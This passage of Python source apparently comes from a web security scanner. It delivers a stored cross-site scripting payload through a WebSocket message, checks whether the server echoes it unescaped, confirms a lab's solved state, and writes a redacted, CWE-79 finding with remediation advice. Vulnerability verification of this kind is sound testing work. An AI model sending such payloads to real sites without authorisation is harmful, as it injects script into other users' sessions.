    async def _send_message_proof(self, websocket_url: str) -> Dict[str, Any]:
        exchange = await self._websocket_handshake(websocket_url)
        if not exchange["valid"]:
            await self._close_writer(exchange.get("writer"), send_close=False)
            return {**exchange, "clientFrame": b"", "serverText": ""}
        frame = _encode_client_frame(0x1, CANONICAL_MESSAGE.encode("utf-8"))
        exchange["writer"].write(frame)
        await exchange["writer"].drain()
        self._application_frames += 1
        self._state_changing_frames += 1
        texts: List[str] = []
        echo_frame = b""
        for _ in range(MAX_SERVER_FRAMES):
            received = await self._read_server_frame(exchange["reader"], exchange["writer"])
            if received is None:
                break
            opcode, payload, raw_frame = received
            if opcode == 0x1:
                text = payload.decode("utf-8", "replace")
                texts.append(text)
                if XSS_PAYLOAD in text:
                    echo_frame = raw_frame
                    break
            elif opcode == 0x8:
                break
        await self._close_writer(exchange.get("writer"), send_close=True)
        return {
            **exchange,
            "clientFrame": frame,
            "serverFrame": echo_frame,
            "serverText": "\n".join(texts),
        }

    async def _read_server_frame(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> Optional[Tuple[int, bytes, bytes]]:
        try:
            header = await asyncio.wait_for(reader.readexactly(2), timeout=5)
        except (asyncio.IncompleteReadError, asyncio.TimeoutError):
            return None
        fin = bool(header[0] & 0x80)
        rsv = header[0] & 0x70
        opcode = header[0] & 0x0F
        masked = bool(header[1] & 0x80)
        marker = header[1] & 0x7F
        if rsv or masked or not fin:
            raise ValueError("server returned unsupported WebSocket framing")
        extension = b""
        if marker == 126:
            extension = await reader.readexactly(2)
            length = struct.unpack("!H", extension)[0]
        elif marker == 127:
            extension = await reader.readexactly(8)
            length = struct.unpack("!Q", extension)[0]
        else:
            length = marker
        if length > self._max_frame:
            raise ValueError("server WebSocket frame exceeded bounded limit")
        payload = await asyncio.wait_for(reader.readexactly(length), timeout=5)
        if opcode == 0x9:
            writer.write(_encode_client_frame(0xA, payload))
            await writer.drain()
            self._control_frames += 1
            return await self._read_server_frame(reader, writer)
        if opcode not in {0x1, 0x8, 0xA}:
            raise ValueError("server returned unsupported WebSocket opcode")
        return opcode, payload, header + extension + payload

    async def _close_writer(
        self, writer: Optional[asyncio.StreamWriter], *, send_close: bool
    ) -> None:
        if writer is None or writer.is_closing():
            return
        if send_close:
            try:
                writer.write(_encode_client_frame(0x8, struct.pack("!H", 1000)))
                await writer.drain()
                self._control_frames += 1
            except (ConnectionError, OSError, ssl.SSLError):
                pass
        writer.close()
        try:
            await writer.wait_closed()
        except (ConnectionError, OSError, ssl.SSLError):
            pass

    def _sanitize(self, value: str) -> str:
        safe = str(value or "").replace("\0", "")
        def redact_header(match: re.Match[str]) -> str:
            name = match.group(1)
            raw_value = match.group(2).strip()
            marker_value = (
                raw_value.split(";", 1)[0]
                if name.lower() == "set-cookie"
                else raw_value
            )
            return f"{name}: {_marker(marker_value)}"

        safe = SENSITIVE_HEADER_RE.sub(redact_header, safe)
        markers: List[Tuple[str, str]] = []
        for index, match in enumerate(
            re.finditer(r"\[REDACTED sha256=[0-9a-f]{64} len=[1-9]\d{0,5}\]", safe)
        ):
            marker = match.group(0)
            sentinel = f"<xasm-ws-marker-{index}>"
            markers.append((sentinel, marker))
            safe = safe.replace(marker, sentinel, 1)
        controls: List[Tuple[str, str]] = []
        for index, match in enumerate(
            re.finditer(r"/\.xasm-websocket-negative-[0-9a-f]{24}", safe)
        ):
            control = match.group(0)
            sentinel = f"<xasm-ws-control-{index}>"
            controls.append((sentinel, control))
            safe = safe.replace(control, sentinel, 1)
        for secret in sorted((s for s in self._secrets if len(s) >= 3), key=len, reverse=True):
            safe = safe.replace(secret, "<redacted-runtime-secret>")
        safe = EMAIL_RE.sub(lambda match: _marker(match.group(0)), safe)
        safe = TOKEN_RE.sub(lambda match: _marker(match.group(0)), safe)
        for sentinel, marker in markers:
            safe = safe.replace(sentinel, marker)
        for sentinel, control in controls:
            safe = safe.replace(sentinel, control)
        safe = re.sub(r"\r?\n{3,}", "\r\n\r\n", safe)
        if len(safe) > MAX_EVIDENCE_CHARS:
            raise ValueError("evidence exceeded bounded non-truncating limit")
        return safe

    def _http_evidence(self, label: str, observation: Dict[str, Any]) -> Dict[str, Any]:
        request = self._sanitize(observation["rawRequest"])
        body = self._sanitize(str(observation.get("body") or ""))
        content_type = "text/html; charset=utf-8"
        for name, value in observation.get("headers", []):
            if str(name).lower() == "content-type":
                content_type = str(value)
                break
        response_header_lines = [
            f"HTTP/1.1 {int(observation['status'])} Xasm",
            f"Content-Type: {content_type}",
            f"Content-Length: {len(body.encode('utf-8'))}",
            "Cache-Control: no-store",
        ]
        response_header_lines.extend(
            f"Set-Cookie: {value}"
            for name, value in observation.get("headers", [])
            if str(name).lower() == "set-cookie"
        )
        response = (
            self._sanitize("\r\n".join(response_header_lines))
            + "\r\n\r\n"
            + body
        )
        return {
            "label": label,
            "url": observation["url"],
            "request": request,
            "requestSha256": _sha(request),
            "response": response,
            "responseSha256": _sha(response),
            "responseBodySha256": _sha(body),
            "responseBodyLength": len(body.encode("utf-8")),
            "responseStatus": int(observation["status"]),
            "responseExcerptTruncated": False,
            "authContextSha256": self._auth_context_sha,
        }

    def _client_discovery_evidence(
        self, client_page: Dict[str, Any], source: Dict[str, Any]
    ) -> Dict[str, Any]:
        step = self._http_evidence(RUNTIME_LABELS[1], source)
        page = self._http_evidence("client-page", client_page)
        page.pop("label", None)
        step.update(
            {
                "clientPageUrl": client_page["url"],
                "discoverySourceUrl": source["url"],
                "clientPageEvidence": page,
            }
        )
        return step

    def _websocket_evidence(
        self,
        label: str,
        observation: Dict[str, Any],
        *,
        client_frame: Optional[bytes] = None,
        client_text: str = "",
        server_text: str = "",
        server_frame: Optional[bytes] = None,
    ) -> Dict[str, Any]:
        request = self._sanitize(observation["rawRequest"])
        response = self._sanitize(observation["headerText"] + "\r\n\r\n")
        if client_frame is not None:
            request += f">>> WS_TEXT\r\n{client_text}"
            response += f"<<< WS_TEXT\r\n{server_text}"
        response_body = self._sanitize(server_text)
        step: Dict[str, Any] = {
            "label": label,
            "websocketUrl": observation["websocketUrl"],
            "request": request,
            "requestSha256": _sha(request),
            "response": response,
            "responseSha256": _sha(response),
            "responseBodySha256": _sha(response_body),
            "responseBodyLength": len(response_body.encode("utf-8")),
            "responseStatus": int(observation["status"]),
            "responseExcerptTruncated": False,
            "authContextSha256": self._auth_context_sha,
        }
        if client_frame is not None:
            step.update(
                {
                    "clientFrameBase64": base64.b64encode(client_frame).decode("ascii"),
                    "clientFrameSha256": _sha_bytes(client_frame),
                    "clientFrameLength": len(client_frame),
                    "serverText": response_body,
                    "decodedServerText": response_body,
                    "serverTextSha256": _sha(response_body),
                    "serverTextLength": len(response_body.encode("utf-8")),
                    "serverFrameBase64": base64.b64encode(server_frame or b"").decode("ascii"),
                    "serverFrameSha256": _sha_bytes(server_frame or b""),
                    "serverFrameLength": len(server_frame or b""),
                }
            )
        return step

    def _verification(
        self,
        proof_level: str,
        steps: List[Dict[str, Any]],
        *,
        client_page_url: Optional[str],
        discovery_source_url: Optional[str],
        websocket_url: Optional[str],
        verified: bool,
        handshake_validated: bool,
        negative_rejected: bool,
        echo_matched: bool,
        solved_transition: bool,
        client_frame: Optional[bytes] = None,
        reason: Optional[str] = None,
    ) -> Dict[str, Any]:
        state_changes: List[Dict[str, Any]] = []
        if client_frame is not None and websocket_url:
            state_changes.append(
                {
                    "kind": "WS_TEXT",
                    "websocketUrl": websocket_url,
                    "frameSha256": _sha_bytes(client_frame),
                    "frameLength": len(client_frame),
                }
            )
        return {
            "verified": verified,
            "fallback": False,
            "mode": MODE,
            "proofLevel": proof_level,
            "targetOrigin": _origin_value(self._target),
            "clientPageUrl": client_page_url,
            "discoverySourceUrl": discovery_source_url,
            "websocketEndpointUrl": websocket_url,
            "messageField": "message" if websocket_url else None,
            "requestCount": self._requests,
            "handshakeCount": self._handshakes,
            "applicationFrameCount": self._application_frames,
            "stateChangingFrameCount": self._state_changing_frames,
            "controlFrameCount": self._control_frames,
            "handshakeValidated": handshake_validated,
            "endpointDerivedFromSource": bool(client_page_url and discovery_source_url and websocket_url),
            "secWebSocketAcceptValidated": handshake_validated,
            "negativeUpgradeRejected": negative_rejected,
            "clientFrameMasked": client_frame is not None,
            "clientTextFrameCount": self._application_frames,
            "clientFramesMasked": client_frame is not None,
            "messageEchoMatched": echo_matched,
            "payloadEchoedUnescaped": echo_matched,
            "labSolvedTransition": solved_transition,
            "authContextSha256": self._auth_context_sha,
            "sessionSource": self._session_source,
            "cookieJarUsed": bool(self._cookies),
            "networkDestinationPreserved": True,
            "destinationIpPinned": True,
            "dnsResolvedOnce": True,
            "freshConnectionPerHandshake": True,
            "redirectsFollowed": False,
            "tlsSniPreserved": urlsplit(self._target).scheme == "https",
            "stateChangingMethods": ["WS_TEXT"] if self._state_changing_frames else [],
            "stateChanges": state_changes,
            "websocketEvidence": {"version": 1, "steps": steps},
            **({"reason": reason} if reason else {}),
        }

    def _result(
        self,
        target: str,
        proof_level: str,
        reason: str,
        steps: List[Dict[str, Any]],
        *,
        client_page_url: Optional[str] = None,
        discovery_source_url: Optional[str] = None,
        websocket_url: Optional[str] = None,
        handshake_validated: bool = False,
        negative_rejected: bool = False,
    ) -> Dict[str, Any]:
        verification = self._verification(
            proof_level,
            steps,
            client_page_url=client_page_url,
            discovery_source_url=discovery_source_url,
            websocket_url=websocket_url,
            verified=False,
            handshake_validated=handshake_validated,
            negative_rejected=negative_rejected,
            echo_matched=False,
            solved_transition=False,
            reason=reason,
        )
        return {
            "success": True,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "proofLevel": proof_level,
            "sessionSource": self._session_source,
            "verified": False,
            "fallback": False,
            "requestCount": self._requests,
            "findings": [],
            "total_findings": 0,
            "verification": verification,
            "summary": {
                "requests": self._requests,
                "applicationFrames": self._application_frames,
                "findings": 0,
                "fallback": False,
            },
        }

    def _finding(
        self,
        client_page_url: str,
        decisive: Dict[str, Any],
        verification: Dict[str, Any],
    ) -> Dict[str, Any]:
        return {
            "template-id": "xasm-websocket-message-xss-verified",
            "matcher-name": "stored-xss-via-websocket-message",
            "matched-at": client_page_url,
            "host": _origin_value(self._target),
            "type": "http",
            "request": decisive["request"],
            "response": decisive["response"],
            "evidence": verification,
            "extracted-results": ["websocket-text-frame", "lab-solved-transition"],
            "info": {
                "name": "Stored Cross-Site Scripting via WebSocket Message",
                "severity": "high",
                "description": (
                    "A tool-owned WebSocket text message was echoed without HTML encoding and "
                    "executed in the lab support victim, causing a fresh Not solved to Solved transition."
                ),
                "remediation": (
                    "Treat every WebSocket message as untrusted input. Validate its schema and "
                    "contextually HTML-encode message content before rendering it."
                ),
                "classification": {"cwe-id": ["CWE-79"]},
            },
        }

    def _error(self, message: str, target: Optional[str] = None) -> Dict[str, Any]:
        return {
            "success": False,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "verified": False,
            "fallback": False,
            "error": message,
            "findings": [],
        }


def get_tool() -> WebWebSocketProbeTool:
    return WebWebSocketProbeTool()
